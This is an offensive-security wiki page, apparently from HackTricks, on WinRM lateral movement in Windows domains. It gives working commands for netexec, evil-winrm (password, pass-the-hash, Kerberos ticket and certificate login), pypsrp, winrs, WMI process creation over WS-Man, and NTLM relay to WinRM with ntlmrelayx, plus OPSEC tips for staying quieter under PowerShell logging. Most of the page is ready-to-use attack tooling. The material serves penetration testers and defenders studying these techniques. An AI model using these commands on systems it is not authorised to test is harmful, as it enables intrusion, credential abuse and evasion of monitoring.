_body: "# WinRM\n\n{{#include ../../banners/hacktricks-training.md}}\n\nWinRM is one of the most convenient **lateral movement**\
  \ transports in Windows environments because it gives you a remote shell over **WS-Man/HTTP(S)** without needing SMB service\
  \ creation tricks. If the target exposes **5985/5986** and your principal is allowed to use remoting, you can often move\
  \ from \"valid creds\" to \"interactive shell\" very quickly.\n\nFor the **protocol/service enumeration**, listeners, enabling\
  \ WinRM, `Invoke-Command`, and generic client usage, check:\n\n{{#ref}}\n../../network-services-pentesting/5985-5986-pentesting-winrm.md\n\
  {{#endref}}\n\n## Why operators like WinRM\n\n- Uses **HTTP/HTTPS** instead of SMB/RPC, so it often works where PsExec-style\
  \ execution is blocked.\n- With **Kerberos**, it avoids sending reusable credentials to the target.\n- Works cleanly from\
  \ **Windows**, **Linux**, and **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).\n- The interactive PowerShell\
  \ remoting path spawns **`wsmprovhost.exe`** on the target under the authenticated user context, which is operationally\
  \ different from service-based exec.\n\n## Access model and prerequisites\n\nIn practice, successful WinRM lateral movement\
  \ depends on **three** things:\n\n1. The target has a **WinRM listener** (`5985`/`5986`) and firewall rules that allow access.\n\
  2. The account can **authenticate** to the endpoint.\n3. The account is allowed to **open a remoting session**.\n\nCommon\
  \ ways to gain that access:\n\n- **Local Administrator** on the target.\n- Membership in **Remote Management Users** on\
  \ newer systems or **WinRMRemoteWMIUsers__** on systems/components that still honor that group.\n- Explicit remoting rights\
  \ delegated through local security descriptors / PowerShell remoting ACL changes.\n\nIf you already control a box with admin\
  \ rights, remember you can also **delegate WinRM access without full admin group membership** using the techniques described\
  \ here:\n\n{{#ref}}\n../active-directory-methodology/security-descriptors.md\n{{#endref}}\n\n### Authentication gotchas\
  \ that matter during lateral movement\n\n- **Kerberos requires a hostname/FQDN**. If you connect by IP, the client usually\
  \ falls back to **NTLM/Negotiate**.\n- In **workgroup** or cross-trust edge cases, NTLM commonly requires either **HTTPS**\
  \ or the target to be added to **TrustedHosts** on the client.\n- With **local accounts** over Negotiate in a workgroup,\
  \ UAC remote restrictions may prevent access unless the built-in Administrator account is used or `LocalAccountTokenFilterPolicy=1`.\n\
  - PowerShell remoting defaults to the **`HTTP/<host>` SPN**. In environments where `HTTP/<host>` is already registered to\
  \ some other service account, WinRM Kerberos may fail with `0x80090322`; use a port-qualified SPN or switch to **`WSMAN/<host>`**\
  \ where that SPN exists.\n\nIf you land valid credentials during password spraying, validating them over WinRM is often\
  \ the fastest way to check whether they translate into a shell:\n\n{{#ref}}\n../active-directory-methodology/password-spraying.md\n\
  {{#endref}}\n\n## Linux-to-Windows lateral movement\n\n### NetExec / CrackMapExec for validation and one-shot execution\n\
  \n```bash\n# Validate creds and execute a simple command\nnetexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x \"whoami\
  \ /all\"\n\n# Pass-the-Hash\nnetexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x \"hostname\"\n\n# PowerShell command instead\
  \ of cmd.exe\nnetexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'\n```\n\n### Evil-WinRM for interactive\
  \ shells\n\n`evil-winrm` remains the most convenient interactive option from Linux because it supports **passwords**, **NT\
  \ hashes**, **Kerberos tickets**, **client certificates**, file transfer, and in-memory PowerShell/.NET loading.\n\n```bash\n\
  # Password\nevil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'\n\n# Pass-the-Hash\nevil-winrm -i <HOST_FQDN> -u <USER>\
  \ -H <NTHASH>\n\n# Kerberos using an existing ccache/kirbi\nexport KRB5CCNAME=./user.ccache\nevil-winrm -i <HOST_FQDN> -r\
  \ <REALM.LOCAL>\n```\n\n### Kerberos SPN edge case: `HTTP` vs `WSMAN`\n\nWhen the default **`HTTP/<host>`** SPN causes Kerberos\
  \ failures, try requesting/using a **`WSMAN/<host>`** ticket instead. This appears in hardened or odd enterprise setups\
  \ where `HTTP/<host>` is already attached to another service account.\n\n```bash\n# Example: use a WSMAN ticket instead\
  \ of the default HTTP SPN\nexport KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache\nevil-winrm -i srv01.domain.local\
  \ -r DOMAIN.LOCAL --spn WSMAN\n```\n\nThis is also useful after **RBCD / S4U** abuse when you specifically forged or requested\
  \ a **WSMAN** service ticket rather than a generic `HTTP` ticket.\n\n### Certificate-based authentication\n\nWinRM also\
  \ supports **client certificate authentication**, but the certificate must be mapped on the target to a **local account**.\
  \ From an offensive perspective this matters when:\n\n- you stole/exported a valid client certificate and private key already\
  \ mapped for WinRM;\n- you abused **AD CS / Pass-the-Certificate** to obtain a certificate for a principal and then pivot\
  \ into another authentication path;\n- you are operating in environments that deliberately avoid password-based remoting.\n\
  \n```bash\nevil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key\n```\n\nClient-certificate WinRM is much less common than\
  \ password/hash/Kerberos auth, but when it exists it can provide a **passwordless lateral movement** path that survives\
  \ password rotation.\n\n### Python / automation with `pypsrp`\n\nIf you need automation rather than an operator shell, `pypsrp`\
  \ gives you WinRM/PSRP from Python with **NTLM**, **certificate auth**, **Kerberos**, and **CredSSP** support.\n\n```python\n\
  from pypsrp.client import Client\n\nclient = Client(\n    \"srv01.domain.local\",\n    username=\"DOMAIN\\\\user\",\n  \
  \  password=\"Password123!\",\n    ssl=False,\n)\nstdout, stderr, rc = client.execute_cmd(\"whoami /all\")\nprint(stdout,\
  \ stderr, rc)\n```\n\n\nIf you need finer control than the high-level `Client` wrapper, the lower-level `WSMan` + `RunspacePool`\
  \ APIs are useful for two common operator problems:\n\n- forcing **`WSMAN`** as the Kerberos service/SPN instead of the\
  \ default `HTTP` expectation used by many PowerShell clients;\n- connecting to a **non-default PSRP endpoint** such as a\
  \ **JEA** / custom session configuration instead of `Microsoft.PowerShell`.\n\n```python\nfrom pypsrp.wsman import WSMan\n\
  from pypsrp.powershell import PowerShell, RunspacePool\n\nwsman = WSMan(\n    \"srv01.domain.local\",\n    auth=\"kerberos\"\
  ,\n    ssl=False,\n    negotiate_service=\"WSMAN\",\n)\n\nwith wsman, RunspacePool(wsman, configuration_name=\"MyJEAEndpoint\"\
  ) as pool, PowerShell(pool) as ps:\n    ps.add_script(\"whoami; Get-Command\")\n    output = ps.invoke()\n    print(output)\n\
  ```\n\n### Custom PSRP endpoints and JEA matter during lateral movement\n\nA successful WinRM authentication does **not**\
  \ always mean you land in the default unrestricted `Microsoft.PowerShell` endpoint. Mature environments may expose **custom\
  \ session configurations** or **JEA** endpoints with their own ACLs and run-as behavior.\n\nIf you already have code execution\
  \ on a Windows host and want to understand what remoting surfaces exist, enumerate the registered endpoints:\n\n```powershell\n\
  Get-PSSessionConfiguration | Select-Object Name, Permission\n```\n\nWhen a useful endpoint exists, target it explicitly\
  \ instead of the default shell:\n\n```powershell\nEnter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint\n\
  ```\n\nPractical offensive implications:\n\n- A **restricted** endpoint can still be enough for lateral movement if it exposes\
  \ just the right cmdlets/functions for service control, file access, process creation, or arbitrary .NET / external command\
  \ execution.\n- A **misconfigured JEA** role is especially valuable when it exposes dangerous commands such as `Start-Process`,\
  \ broad wildcards, writable providers, or custom proxy functions that let you escape the intended restrictions.\n- Endpoints\
  \ backed by **RunAs virtual accounts** or **gMSAs** change the effective security context of the commands you run. In particular,\
  \ a gMSA-backed endpoint can provide **network identity on the second hop** even when a normal WinRM session would hit the\
  \ classic delegation problem.\n\n## Windows-native WinRM lateral movement\n\n### `winrs.exe`\n\n`winrs.exe` is built in\
  \ and useful when you want **native WinRM command execution** without opening an interactive PowerShell remoting session:\n\
  \n```cmd\nwinrs -r:srv01.domain.local cmd /c whoami\nwinrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\\\user -p:Password123!\
  \ hostname\n```\n\nTwo flags are easy to forget and matter in practice:\n\n- `/noprofile` is often required when the remote\
  \ principal is **not** a local administrator.\n- `/allowdelegate` enables the remote shell to use your credentials against\
  \ a **third host** (for example, when the command needs `\\\\fileserver\\share`).\n\n```cmd\nwinrs -r:srv01.domain.local\
  \ /noprofile cmd /c set\nwinrs -r:srv01.domain.local /allowdelegate cmd /c dir \\\\fileserver.domain.local\\share\n```\n\
  \nOperationally, `winrs.exe` commonly results in a remote process chain similar to:\n\n```text\nsvchost.exe (DcomLaunch)\
  \ -> winrshost.exe -> cmd.exe /c <command>\n```\n\nThis is worth remembering because it differs from service-based exec\
  \ and from interactive PSRP sessions.\n\n### `winrm.cmd` / WS-Man COM instead of PowerShell remoting\n\nYou can also execute\
  \ through **WinRM transport** without `Enter-PSSession` by invoking WMI classes over WS-Man. This keeps the transport as\
  \ WinRM while the remote execution primitive becomes **WMI `Win32_Process.Create`**:\n\n```cmd\nwinrm invoke Create wmicimv2/Win32_Process\
  \ @{CommandLine=\"cmd.exe /c whoami > C:\\\\Windows\\\\Temp\\\\who.txt\"} -r:srv01.domain.local\n```\n\nThat approach is\
  \ useful when:\n\n- PowerShell logging is heavily monitored.\n- You want **WinRM transport** but not a classic PS remoting\
  \ workflow.\n- You are building or using custom tooling around the **`WSMan.Automation`** COM object.\n\n## NTLM relay to\
  \ WinRM (WS-Man)\n\nWhen SMB relay is blocked by signing and LDAP relay is constrained, **WS-Man/WinRM** may still be an\
  \ attractive relay target. Modern `ntlmrelayx.py` includes **WinRM relay servers** and can relay to **`wsman://`** or **`winrms://`**\
  \ targets.\n\n```bash\n# Relay to HTTP WinRM\nntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support\n\
  \n# Relay to HTTPS WinRM\nntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support\n```\n\nTwo practical\
  \ notes:\n\n- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.\n\
  - Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do\
  \ not break the relay flow.\n\nFor multi-hop constraints after landing a first WinRM session, check:\n\n{{#ref}}\n../active-directory-methodology/kerberos-double-hop-problem.md\n\
  {{#endref}}\n\n## OPSEC and detection notes\n\n- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`**\
  \ on the target.\n- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.\n- Custom\
  \ **JEA** endpoints may execute actions as **`WinRM_VA_*`** virtual accounts or as a configured **gMSA**, which changes\
  \ both telemetry and second-hop behavior compared to a normal user-context shell.\n- Expect **network logon** telemetry,\
  \ WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.\n- If\
  \ you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting\
  \ session.\n- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward\
  \ client-side `TrustedHosts` changes.\n\n## References\n\n- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)\n\
